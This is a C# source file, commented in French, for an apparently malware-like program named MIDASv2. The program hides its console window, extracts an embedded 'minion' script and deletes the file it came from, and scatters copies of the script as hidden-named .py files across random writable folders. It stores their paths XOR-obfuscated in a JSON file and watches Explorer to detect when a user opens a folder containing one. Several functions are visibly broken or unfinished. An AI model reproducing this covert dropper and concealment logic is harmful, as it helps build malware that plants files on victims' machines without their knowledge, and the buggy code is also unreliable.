using System;
using System.IO;
using System.Reflection;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.Text.Json;
using System.Security.Cryptography.X509Certificates;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Runtime.InteropServices;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

class MIDAS
{
    public static void init(){
        string MinionScript = Program.ExtractBetween(Program.open("./FLforMDSv2.txt", "r"), "__MN1MDSv2a__", "__MN1MDSv2z__");
        File.Delete("./FLforMDSv2.txt");
        string[] ValablePath = Program.GetRandomStrings(Program.ListAllFolder(25, Program.GetAvailableDrives()));
        foreach(string path in ValablePath){
            Program.open($"{path}.MDSv2.py", "w", MinionScript);
        }
        
    }
}
class FileWatcherV1
{
    public static void Start()
    {
        // Spécifiez le chemin du dossier à surveiller
        string pathToWatch = @"C:\test";

        // Créez une instance de FileSystemWatcher
        FileSystemWatcher watcher = new FileSystemWatcher();

        // Spécifiez le chemin du dossier à surveiller
        watcher.Path = pathToWatch;

        // Activez la surveillance pour les actions spécifiées
        watcher.NotifyFilter = NotifyFilters.LastWrite |
                               NotifyFilters.FileName |
                               NotifyFilters.DirectoryName;

        // Définir les événements à surveiller
        watcher.IncludeSubdirectories = true;
        watcher.Changed += OnChanged;
        watcher.Created += OnChanged;
        watcher.Deleted += OnChanged;
        watcher.Renamed += OnRenamed;

        // Commencez à surveiller
        watcher.EnableRaisingEvents = true;

        // Attendez une entrée de l'utilisateur pour terminer le programme
        Console.WriteLine("Appuyez sur une touche pour arrêter la surveillance.");
        Console.ReadKey();
    }

    // Méthode appelée lorsqu'un fichier est modifié, créé ou supprimé
    private static void OnChanged(object sender, FileSystemEventArgs e)
    {
        Console.WriteLine($"Fichier {e.ChangeType}: {e.FullPath}");
    }

    // Méthode appelée lorsqu'un fichier est renommé
    private static void OnRenamed(object sender, RenamedEventArgs e)
    {
        Console.WriteLine($"Fichier renommé: Ancien nom = {e.OldFullPath}, Nouveau nom = {e.FullPath}");
    }
}
class HERMES
{
    public static string GetCurrentDirectory()
    {
        // Obtient le chemin absolu du fichier exécutable de l'assembly en cours
        // Utilisation de System.AppContext.BaseDirectory pour obtenir le chemin du répertoire de l'application
        string assemblyLocation = System.AppContext.BaseDirectory;


        // Obtient le répertoire contenant le fichier exécutable de l'assembly en cours
        string? currentDirectory = Path.GetDirectoryName(assemblyLocation);

        // Si le chemin est vide (exécuté dans l'IDE), utilisez le répertoire de base de l'application
        if (string.IsNullOrEmpty(currentDirectory))
        {
            // Obtient le répertoire de base de l'application
            currentDirectory = AppDomain.CurrentDomain.BaseDirectory;
        }

        return currentDirectory;
    }
    public static bool IsActiveAndVisible() // * V9
    // Lorsque nous utilisons la fonction FindWindow("CabinetWClass", null), nous demandons
    //  à Windows de nous renvoyer le handle (l'identifiant) de la première fenêtre qu'il 
    //  trouve avec la classe de fenêtre "CabinetWClass". Si une telle fenêtre existe,
    //  cela signifie généralement qu'elle est associée à l'Explorateur Windows.
    {
        [DllImport("user32.dll")]
        static extern IntPtr FindWindow(string lpClassName, string? lpWindowName);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsWindowVisible(IntPtr hWnd);
        bool isExplorerVisible = IsExplorerWindowVisible();

        if (isExplorerVisible)
        {
            return true;
        }
        else
        {
            return false;
        }

        static bool IsExplorerWindowVisible()
        {
            IntPtr explorerHandle = FindWindow("CabinetWClass", null);
            return explorerHandle != IntPtr.Zero && IsWindowVisible(explorerHandle);
        }
    }

    public static string OpenFolder() // * V11
    // ce script dit quelle dossier est ouvert , il peut etre couplé avec HERMES pour une meilleur sécurité
    {
        const int WM_GETTEXT = 0x0D;

        [DllImport("user32.dll")]
        static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, StringBuilder lParam);

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId(IntPtr hWnd, out int lpdwProcessId);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        IntPtr explorerHandle = GetForegroundWindow();
        int processId;
        GetWindowThreadProcessId(explorerHandle, out processId);

        string currentFolderPath = GetCurrentFolderPath(explorerHandle);
        return currentFolderPath;

        static string GetCurrentFolderPath(IntPtr hWnd)
        {
            StringBuilder title = new StringBuilder(256);
            SendMessage(hWnd, WM_GETTEXT, new IntPtr(title.Capacity), title);
            return title.ToString();
        }
    }

    public static string SearchChildrenRoot(string targetChild) // * V9
    // fait la meme chose que Findirectory mais a la racine
    {
        try
        {
            string[] drives = Environment.GetLogicalDrives();
            foreach (string drive in drives)
            {
                DirectoryInfo root = new DirectoryInfo(drive);

                foreach (DirectoryInfo dir in root.GetDirectories())
                {
                    if (dir.Name == targetChild)
                    {
                        return dir.FullName;
                    }
                }

                string usersDirectory = Path.Combine(root.FullName, "Users");
                if (Directory.Exists(usersDirectory))
                {
                    foreach (string userDirectory in Directory.GetDirectories(usersDirectory))
                    {
                        string desktopPath = Path.Combine(userDirectory, "Desktop");
                        if (Directory.Exists(desktopPath))
                        {
                            foreach (DirectoryInfo dir in new DirectoryInfo(desktopPath).GetDirectories())
                            {
                                if (dir.Name == targetChild)
                                {
                                    return dir.FullName;
                                }
                            }
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error searching for directory: {ex.Message}");
        }

        return "e:1"; // Retourne une erreur si le répertoire n'est pas trouvé ou s'il y a une exception
    }


    public static string FindDirectory(string parentDirectory, string targetDirectory) // * V3
    // cette fonction permet de savoir si le repertoire arg1 contient le repertoire\dossier (sans chemin absolu) arg2 et retourne 
    // le chemin absolu du target 
    {
        try
        {
            if (!Directory.Exists(parentDirectory))
                throw new DirectoryNotFoundException($"Parent directory {parentDirectory} not found.");

            // Recherche le dossier cible dans le répertoire parent
            DirectoryInfo[] subDirs = new DirectoryInfo(parentDirectory).GetDirectories();
            DirectoryInfo? targetDir = subDirs.FirstOrDefault(dir => dir.Name == targetDirectory) ?? default;

            return targetDir != null ? targetDir.FullName : "e:0";
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error finding directory: {ex.Message}");
            return "e:0";
        }
    }

    public static string GetParentDirectoryName(string fullPath) // * V1
    // donne le nom du repertoire parent d'un chemin absolu
    {
        try
        {
            // Récupère le répertoire parent du chemin complet
            DirectoryInfo? parentDir = Directory.GetParent(fullPath);
            if (parentDir != null)
            {
                return parentDir.FullName;
            }
            else
            {
                // Si le chemin ne contient pas de répertoire parent
                return "No parent directory";
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error getting parent directory name: {ex.Message}");
            return "Error";
        }
    }

    static string FormatRepertory(string chemin)
    {
        // Séparation du chemin en répertoires
        string[] repertoires = chemin.Split(Path.DirectorySeparatorChar);

        // Retourner le dernier répertoire
        return repertoires[repertoires.Length - 1];
    }
    static string[] SplitString(string input, string separator)
    {
        // Utilisation de la méthode Split pour séparer la chaîne en fonction du séparateur
        string[] parts = input.Split(new string[] { separator }, StringSplitOptions.None);
        return parts;
    }
    public static string[] GetChildDirectories(string path)
    {
        string[] u = [];
        try
        {
            // Vérifie si le chemin spécifié existe
            if (!Directory.Exists(path))
            {
                return ["e:3"];
            }

            // Récupère tous les sous-répertoires du chemin spécifié
            string[] childDirectories = Directory.GetDirectories(path);

            return childDirectories;
        }
        catch (Exception)
        {
            return ["e:2"];
        }

    }
    public static bool checkPermAndExist(string? chemin)
    {
        try
        {
            // Vérifier si le dossier existe
            if (!Directory.Exists(chemin))
            {
                return false;
            }

            // Tentative de création d'un fichier dans le dossier
            string testFile = Path.Combine(chemin, "test.txt");
            File.WriteAllText(testFile, "Test");

            // Suppression du fichier créé
            File.Delete(testFile);

            // Si la création et la suppression du fichier se déroulent sans erreur, les permissions sont correctes
            return true;
        }
        catch (Exception)
        {
            // En cas d'erreur, afficher l'erreur et retourner faux
            return false;
        }
    }
    public static void Start()
    { // * V2
      // il faut que le script execute une fonction quand l'utilisateur ouvre un dossier contenant une partie de MIDAS
      // niveau des alertes : 
      // Parent direct : niveau 0
      // Grand-parent direct : niveau 1
        string[] MidasFile = SplitString(Program.EncryptXOR(Json.Get(Json.JFile(), "AllFile"), "MIDASv2"), "__MDS__");
        string[] statutMidasFile = MidasFile;
        while (true)
        {
            if (IsActiveAndVisible())
            {
                foreach (string i in MidasFile)
                {
                    if (FormatRepertory(GetParentDirectoryName(i)) == OpenFolder())
                    {
                        Console.WriteLine("alerte niveau 0 for " + i);
                    }
                    if (FormatRepertory(GetParentDirectoryName(GetParentDirectoryName(i))) == OpenFolder())
                    {
                        Console.WriteLine("alerte niveau 1 for " + i);
                    }

                }
            }
            Thread.Sleep(1000);
        }
    }
}
class Json
{
    public static void RemoveJsonKey(string filePath, string keyToRemove)
    {
        try
        {
            // Lecture du contenu du fichier JSON
            string jsonContent = File.ReadAllText(filePath);

            // Parsing du contenu JSON
            JObject jsonObject = JObject.Parse(jsonContent);

            // Suppression de la clé
            if (jsonObject[keyToRemove] != null)
            {
                jsonObject.Remove(keyToRemove);

                // Écriture du nouveau contenu dans le fichier JSON
                File.WriteAllText(filePath, jsonObject.ToString());

            }
        }
        catch (Exception ex)
        {
            // Gestion des erreurs de lecture du fichier ou de parsing JSON
            Console.WriteLine($"Une erreur s'est produite : {ex.Message}");
        }
    }
    static void AddJsonKey(string filePath, string key, string valeur)
    {
        try
        {
            // Lecture du contenu du fichier JSON
            string jsonContent = File.ReadAllText(filePath);

            // Parsing du contenu JSON
            JObject jsonObject = JObject.Parse(jsonContent);

            // Ajout de la nouvelle clé et de sa valeur
            jsonObject[key] = valeur;

            // Écriture du nouveau contenu dans le fichier JSON
            File.WriteAllText(filePath, jsonObject.ToString());

        }
        catch (Exception ex)
        {
            // Gestion des erreurs de lecture du fichier ou de parsing JSON
            Console.WriteLine($"Une erreur s'est produite : {ex.Message}");
        }
    }
    public static bool IsJsonKeyExist(string filePath, string key)
    {
        try
        {
            // Lecture du contenu du fichier JSON
            string jsonContent = File.ReadAllText(filePath);

            // Parsing du contenu JSON
            JObject jsonObject = JObject.Parse(jsonContent);

            // Vérification de l'existence de la clé
            return jsonObject[key] != null;
        }
        catch (Exception)
        {
            // Gestion des erreurs de lecture du fichier ou de parsing JSON
            return false;
        }
    }
    public static string JFile()
    {
        string f1 = HERMES.GetParentDirectoryName(HERMES.GetCurrentDirectory());
        string f2 = $"{f1}MDS2.json";
        return f2;
    }

    public static string Get(string filePath, string search)
    {
        try
        {
            string jsonString = File.ReadAllText(filePath);
            using (JsonDocument document = JsonDocument.Parse(jsonString))
            {
                JsonElement root = document.RootElement;
                JsonElement foundElement = root;

                // Split the search string by '.' to traverse the JSON hierarchy
                string[] searchKeys = search.Split('.');

                foreach (string key in searchKeys)
                {
                    if (foundElement.ValueKind == JsonValueKind.Object && foundElement.TryGetProperty(key, out JsonElement property))
                    {
                        foundElement = property;
                    }
                    else
                    {
                        // If the key is not found, return an empty string
                        return "e:4";
                    }
                }

                // Return the value of the found element
                return foundElement.ToString();
            }
        }
        catch (FileNotFoundException)
        {
            return "e:5";
        }
        catch (System.Text.Json.JsonException)
        {
            return "e:6";
        }
        catch (Exception)
        {
            return "e:0";
        }
    }
    public static void Mod(string cheminFichier, string cheminPropriete, string valeurPropriete)
    {
        try
        {
            if (!IsJsonKeyExist(cheminFichier, cheminPropriete))
            {
                AddJsonKey(cheminFichier, cheminPropriete, valeurPropriete.ToString());
            }
            else
            {
                // Charger le contenu JSON à partir du fichier
                string contenuJson = File.ReadAllText(cheminFichier);

                // Convertir le contenu JSON en objet JObject
                JObject objetJson = JObject.Parse(contenuJson);

                // Diviser le chemin de la propriété en parties
                string[] parties = cheminPropriete.Split('.');

                // Obtenir le parent pour ajouter la propriété finale
                JToken? parent = objetJson;

                for (int i = 0; i < parties.Length - 1; i++)
                {
                    string partie = parties[i];
                    if (parent != null && parent[partie] != null)
                    {
                        parent = parent[partie];
                    }
                }

                // Ajouter la propriété finale avec la valeur spécifiée
                if (parent != null && parent[parties] != null)
                {
                    parent[parties[parties.Length - 1]] = JToken.FromObject(valeurPropriete);
                }

                // Écrire le contenu modifié dans le fichier JSON
                File.WriteAllText(cheminFichier, objetJson.ToString());
            }
        }

        catch (Exception ex)
        {
            Console.WriteLine("Une erreur s'est produite : " + ex.Message);
        }
    }
}
class Program
{
    // Importer les fonctions nécessaires à partir de l'API Windows
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;
    const int SW_SHOW = 5;
    static Random random = new Random();

    public static string[] GetAvailableDrives()
    {


        return ["f"];
    }
    public static string[] GetRandomStrings(string[] inputArray)
    {
        // Vérifie si le tableau d'entrée est assez grand pour retourner 10 éléments aléatoires
        if (inputArray.Length < 10)
        {
            throw new ArgumentException("Le tableau d'entrée doit contenir au moins 10 éléments.");
        }

        // Sélectionne 10 indices aléatoires distincts
        var randomIndices = Enumerable.Range(0, inputArray.Length).OrderBy(x => random.Next()).Take(10);

        // Retourne les éléments correspondant aux indices sélectionnés
        return randomIndices.Select(index => inputArray[index]).ToArray();
    }
    public static string ExtractBetween(string input, string start, string end)
    {
        int startIndex = input.IndexOf(start);
        int endIndex = input.IndexOf(end);

        if (startIndex == -1 || endIndex == -1)
        {
            return "e:7"; // Start ou End n'est pas trouvé dans la chaîne
        }

        startIndex += start.Length;

        if (endIndex <= startIndex)
        {
            return "e:8"; // End est trouvé avant Start ou ils se chevauchent
        }

        return input.Substring(startIndex, endIndex - startIndex);
    }
    public static string[] SplitString(string input, string separator)
    {
        // Utilisation de la méthode Split pour séparer la chaîne en fonction du séparateur
        string[] parts = input.Split(new string[] { separator }, StringSplitOptions.None);
        return parts;
    }
    public static string[] ListAllFolder(int mx, string[] letters)
    {
        string[] enf = [];
        int i = 0;
        while (true)
        {
            if (i == 0)
            {
                foreach (string letter in letters)
                {
                    foreach (string e in HERMES.GetChildDirectories(letter))
                    {
                        if (e != null || e != "" || e != "e:2" || e != "e:3")
                        {
                            if (HERMES.checkPermAndExist(e))
                            {
                                enf = DelValue(enf, letter);
                                enf = AddValue(enf, e);
                            }
                            else
                            {
                                enf = DelValue(enf, letter);
                            }
                        }
                        if (e == "e:2" || e == "e:3")
                        {
                            enf = DelValue(enf, letter);
                        }
                    }
                }
            }
            else
            {
                foreach (string en in enf)
                {
                    foreach (string e in HERMES.GetChildDirectories(en))
                    {
                        if (e != null || e != "" || e != "e:2" || e != "e:3")
                        {
                            if (HERMES.checkPermAndExist(e))
                            {
                                enf = DelValue(enf, en);
                                enf = AddValue(enf, e);
                            }
                            else
                            {
                                enf = DelValue(enf, en);
                            }
                        }
                        if (e == "e:2" || e == "e:3")
                        {
                            enf = DelValue(enf, en);
                        }
                    }
                }
            }
            ++i;
            Console.WriteLine(i);
            if (i == mx)
            {
                return enf;
            }
        }
    }
    public static string[] AddValue(string[] tableau, string? nouvelleValeur)
    {
        nouvelleValeur = null!;
        // Créer un nouveau tableau avec une taille augmentée d'un élément
        string[] nouveauTableau = new string[tableau.Length + 1];

        // Copier les éléments du tableau original dans le nouveau tableau
        for (int i = 0; i < tableau.Length; i++)
        {
            nouveauTableau[i] = tableau[i];
        }

        // Ajouter la nouvelle valeur à la fin du nouveau tableau
        nouveauTableau[tableau.Length] = nouvelleValeur;

        // Retourner le nouveau tableau
        return nouveauTableau;
    }
    public static string[] DelValue(string[] tableau, string delval)
    {
        // Compter le nombre d'occurrences de la valeur à supprimer
        int count = 0;
        foreach (string element in tableau)
        {
            if (element == delval)
                count++;
        }

        // Créer un nouveau tableau avec la taille ajustée
        string[] resultat = new string[tableau.Length - count];
        int index = 0;

        // Copier les éléments du tableau original dans le nouveau tableau en ignorant les occurrences de la valeur à supprimer
        foreach (string element in tableau)
        {
            if (element != delval)
            {
                resultat[index] = element;
                index++;
            }
        }

        return resultat;
    }
    static void ShowConsole(bool show)
    {
        IntPtr handle = GetConsoleWindow(); // Récupère le handle de la fenêtre de la console
        if (handle != IntPtr.Zero)
        {
            if (show)
                ShowWindow(handle, SW_SHOW); // Affiche la console
            else
                ShowWindow(handle, SW_HIDE); // Masque la console
        }
    }
    static void print(string? text, string? color = null, string? end = "\n")
    {
        ConsoleColor? ancienneCouleur = null; // Garder une trace de l'ancienne couleur
        if (color != null)
        {
            ancienneCouleur = Console.ForegroundColor; // Sauvegarder la couleur d'origine
            switch (color)
            {
                case "Black":
                    Console.ForegroundColor = ConsoleColor.Black;
                    break;
                case "DarkBlue":
                    Console.ForegroundColor = ConsoleColor.DarkBlue;
                    break;
                case "DarkGreen":
                    Console.ForegroundColor = ConsoleColor.DarkGreen;
                    break;
                case "DarkCyan":
                    Console.ForegroundColor = ConsoleColor.DarkCyan;
                    break;
                case "DarkRed":
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    break;
                case "DarkMagenta":
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;
                    break;
                case "DarkYellow":
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    break;
                case "Gray":
                    Console.ForegroundColor = ConsoleColor.Gray;
                    break;
                case "DarkGray":
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    break;
                case "Blue":
                    Console.ForegroundColor = ConsoleColor.Blue;
                    break;
                case "Green":
                    Console.ForegroundColor = ConsoleColor.Green;
                    break;
                case "Cyan":
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    break;
                case "Red":
                    Console.ForegroundColor = ConsoleColor.Red;
                    break;
                case "Magenta":
                    Console.ForegroundColor = ConsoleColor.Magenta;
                    break;
                case "Yellow":
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    break;
                case "White":
                    Console.ForegroundColor = ConsoleColor.White;
                    break;
                default:
                    Console.ForegroundColor = ConsoleColor.White; // Couleur par défaut si une couleur inconnue est rencontrée
                    break;
            }
        }
        Console.Write(text + end);
        if (ancienneCouleur != null) // Restaurer la couleur d'origine si elle a été modifiée
        {
            Console.ForegroundColor = ancienneCouleur.Value;
        }
    }
    public static string open(string filePath, string mode, string? text = "")
    {
        if (File.Exists(filePath))
        {
            try
            {
                // gestions des erreurs :
                if (mode == "wl" && mode == "w" && mode != null && text == "")
                {
                    return "error";
                }
                switch (mode)
                {
                    case "a":
                        File.AppendAllText(filePath, text);
                        break;
                    case "w":
                        File.WriteAllText(filePath, text);
                        break;
                    case "r":
                        return File.ReadAllText(filePath);
                    default:
                        throw new ArgumentException("Invalid mode specified.");
                }
            }
            catch (Exception ex)
            {
                return $"Error: {ex.Message}";
            }
        }
        else
        {
            return "File does not exist.";
        }
        return string.Empty;
    }
    static string input(string? text = null)
    {
        if (text != null)
        {
            Console.Write(text);
        }
        string? input = Console.ReadLine();
        if (input != null)
            return input;
        else
            return "";
    }
    static string TextToBinary(string text)
    {
        StringBuilder binary = new StringBuilder();
        foreach (char c in text)
        {
            binary.Append(Convert.ToString(c, 2).PadLeft(8, '0'));
        }
        return binary.ToString();
    }
    static string BinaryToText(string binary)
    {
        StringBuilder text = new StringBuilder();
        for (int i = 0; i < binary.Length; i += 8)
        {
            string binaryChar = binary.Substring(i, 8);
            text.Append(Convert.ToChar(Convert.ToInt32(binaryChar, 2)));
        }
        return text.ToString();
    }
    public static string EncryptXOR(string text, string key)
    {
        key = AdjustKey(key, text.Length);
        StringBuilder encrypted = new StringBuilder();
        for (int i = 0; i < text.Length; i++)
        {
            encrypted.Append((char)(text[i] ^ key[i % key.Length]));
        }
        return encrypted.ToString();
    }
    static string AdjustKey(string key, int length)
    {
        if (key.Length < length)
        {
            StringBuilder adjustedKey = new StringBuilder(key);
            while (adjustedKey.Length < length)
            {
                adjustedKey.Append(key);
            }
            return adjustedKey.ToString().Substring(0, length);
        }
        else if (key.Length > length)
        {
            return key.Substring(0, length);
        }
        else
        {
            return key;
        }
    }
    static void creator(string name, string containe)
    {
        try
        {
            using (StreamWriter writer = new StreamWriter(name))
            {
                writer.Write(containe);
            }

        }
        catch (Exception ex)
        {
            Console.WriteLine("Une erreur s'est produite : " + ex.Message);
        }
    }
    static void ConfigBasic()
    {
        creator(Json.JFile(), "{\n}");
        Json.Mod(Json.JFile(), "start", DateTime.Now.ToString());
        Json.Mod(Json.JFile(), "AllFile", EncryptXOR("Can't catch", "MIDASv2")); // TODO remplacer Can't catch par les chemin des mignons
    }
    static void Main(string[] arg)
    {
        ShowConsole(false);
        // Récupération du chemin absolu du fichier en cours d'exécution
        string? absolutePath = null;
        var mainModule = Process.GetCurrentProcess().MainModule;
        if (mainModule != null)
        {
            absolutePath = mainModule.FileName;
        }
        if (!File.Exists(Json.JFile()))
        {
            creator(Json.JFile(), "{\n\n}");
        }
        // * Check de l'état si existant
        if(Json.Get(Json.JFile(), "MDSFirstCommand") == "new"){
            MIDAS.init();
        }
        // ! Gestion des Erreurs e:4 : key not found e:5 file not found
        string start00 = Json.Get(Json.JFile(), "start");
        string allfile00 = Json.Get(Json.JFile(), "AllFile");
        if (start00 == "e:4" || !DateTime.TryParse(start00, out DateTime executionTimeeeee))
        {
            if (!Json.IsJsonKeyExist(Json.JFile(), "start"))
            {
                ConfigBasic();
            }
            else { Json.Mod(Json.JFile(), "start", DateTime.Now.ToString()); }
        }
        if (start00 == "e:5" || allfile00 == "e:5")
        {
            ConfigBasic();
        }

        string executionTimeString = Json.Get(Json.JFile(), "start");

        DateTime.TryParse(executionTimeString, out DateTime executionTime);
        // Wait until the specified execution time
        Thread Hermes = new Thread(HERMES.Start);
        Hermes.Start();
        while (DateTime.Now < executionTime)
        {
            Thread.Sleep(100); // Wait for 1 second
        }
        // Execute the rest of the script here
        Console.WriteLine("Executing the script now!");
        Console.ReadLine();
    }

}